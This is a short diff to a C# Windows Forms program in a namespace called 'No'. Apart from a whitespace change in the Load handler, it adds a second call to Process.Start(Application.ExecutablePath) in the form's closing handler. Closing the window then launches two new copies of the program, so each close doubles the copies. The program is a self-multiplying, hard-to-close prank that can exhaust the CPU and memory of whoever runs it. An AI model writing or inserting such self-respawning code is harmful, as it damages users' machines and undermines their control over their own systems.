@@ -20,11 +20,12 @@ namespace No
 
         private void No_Load(object sender, EventArgs e)
         {
-
+            
         }
 
         private void No_FormClosing(object sender, FormClosingEventArgs e)
         {
+            Process.Start(Application.ExecutablePath);
             Process.Start(Application.ExecutablePath);
         }
 
